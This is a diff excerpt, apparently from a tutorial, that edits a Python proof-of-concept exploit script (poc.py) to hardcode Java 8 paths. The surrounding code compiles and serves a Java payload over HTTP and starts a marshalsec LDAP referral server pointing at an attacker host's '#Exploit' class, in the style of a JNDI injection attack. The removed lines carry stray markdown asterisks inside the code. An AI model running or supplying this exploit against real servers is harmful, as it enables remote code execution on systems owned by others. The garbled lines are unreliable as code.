@@ -154,7 +154,7 @@ Modify the poc.py file to point to the jAVA_HOME as follows:
 #!/usr/bin/env python3
     try:
         p.write_text(program)
-        subprocess.run([os.path.join(CUR_FOLDER, **"/usr/lib/jvm/java-8-openjdk-amd64/bin/javac"**), str(p)])
+        subprocess.run([os.path.join(CUR_FOLDER, "/usr/lib/jvm/java-8-openjdk-amd64/bin/javac"), str(p)])
     except OSError as e:
         print(Fore.RED + f'[-] Something went wrong {e}')
         raise e
@@ -172,7 +172,7 @@ def payload(userip: str, webport: int, lport: int) -> None:
     httpd.serve_forever()
 def check_java() -> bool:
     exit_code = subprocess.call([
-        os.path.join(CUR_FOLDER, **'/usr/lib/jvm/java-8-openjdk-amd64/bin/java'**),
+        os.path.join(CUR_FOLDER, '/usr/lib/jvm/java-8-openjdk-amd64/bin/java'),
         '-version',
     ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
     return exit_code == 0
@@ -182,7 +182,7 @@ def ldap_server(userip: str, lport: int) -> None:
     print(Fore.GREEN + f"[+] Send me: {sendme}\n")
     url = "http://{}:{}/#Exploit".format(userip, lport)
     subprocess.run([
-        os.path.join(CUR_FOLDER, **"/usr/lib/jvm/java-8-openjdk-amd64/bin/java"**),
+        os.path.join(CUR_FOLDER, "/usr/lib/jvm/java-8-openjdk-amd64/bin/java"),
         "-cp",
         os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
         "marshalsec.jndi.LDAPRefServer",
